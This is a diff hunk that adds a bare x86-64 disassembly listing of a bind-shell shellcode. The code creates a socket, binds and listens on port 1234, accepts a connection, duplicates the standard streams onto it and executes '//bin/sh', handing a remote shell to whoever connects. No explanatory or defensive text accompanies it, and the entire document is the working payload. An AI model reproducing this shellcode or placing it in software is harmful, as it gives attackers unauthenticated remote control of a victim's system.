@@ -1,0 +1,55 @@
+401000: 48 31 d2             	xor    rdx,rdx
+  401003:	48 31 f6             	xor    rsi,rsi
+  401006:	48 83 c6 01          	add    rsi,0x1
+  40100a:	48 31 ff             	xor    rdi,rdi
+  40100d:	48 83 c7 02          	add    rdi,0x2
+  401011:	48 31 c0             	xor    rax,rax
+  401014:	48 83 c0 29          	add    rax,0x29
+  401018:	0f 05                	syscall 
+  40101a:	48 89 c7             	mov    rdi,rax
+  40101d:	48 31 c0             	xor    rax,rax
+  401020:	50                   	push   rax
+  401021:	66 68 04 d2          	pushw  0xd204
+  401025:	66 6a 02             	pushw  0x2
+  401028:	48 89 e6             	mov    rsi,rsp
+  40102b:	48 31 d2             	xor    rdx,rdx
+  40102e:	48 83 c2 10          	add    rdx,0x10
+  401032:	48 31 c0             	xor    rax,rax
+  401035:	48 83 c0 31          	add    rax,0x31
+  401039:	0f 05                	syscall 
+  40103b:	48 31 f6             	xor    rsi,rsi
+  40103e:	48 83 c6 01          	add    rsi,0x1
+  401042:	48 31 c0             	xor    rax,rax
+  401045:	48 83 c0 32          	add    rax,0x32
+  401049:	0f 05                	syscall 
+  40104b:	48 31 c0             	xor    rax,rax
+  40104e:	48 83 c0 2b          	add    rax,0x2b
+  401052:	48 31 f6             	xor    rsi,rsi
+  401055:	48 31 d2             	xor    rdx,rdx
+  401058:	0f 05                	syscall 
+  40105a:	48 89 c3             	mov    rbx,rax
+  40105d:	48 89 df             	mov    rdi,rbx
+  401060:	48 31 c0             	xor    rax,rax
+  401063:	48 83 c0 21          	add    rax,0x21
+  401067:	48 31 f6             	xor    rsi,rsi
+  40106a:	0f 05                	syscall 
+  40106c:	48 31 c0             	xor    rax,rax
+  40106f:	48 83 c0 21          	add    rax,0x21
+  401073:	48 ff c6             	inc    rsi
+  401076:	0f 05                	syscall 
+  401078:	48 31 c0             	xor    rax,rax
+  40107b:	48 83 c0 21          	add    rax,0x21
+  40107f:	48 ff c6             	inc    rsi
+  401082:	0f 05                	syscall 
+  401084:	48 31 c0             	xor    rax,rax
+  401087:	50                   	push   rax
+  401088:	48 89 e2             	mov    rdx,rsp
+  40108b:	48 bb 2f 2f 62 69 6e 	movabs rbx,0x68732f6e69622f2f
+  401092:	2f 73 68 
+  401095:	53                   	push   rbx
+  401096:	48 89 e7             	mov    rdi,rsp
+  401099:	50                   	push   rax
+  40109a:	57                   	push   rdi
+  40109b:	48 89 e6             	mov    rsi,rsp
+  40109e:	48 83 c0 3b          	add    rax,0x3b
+  4010a2:	0f 05                	syscall
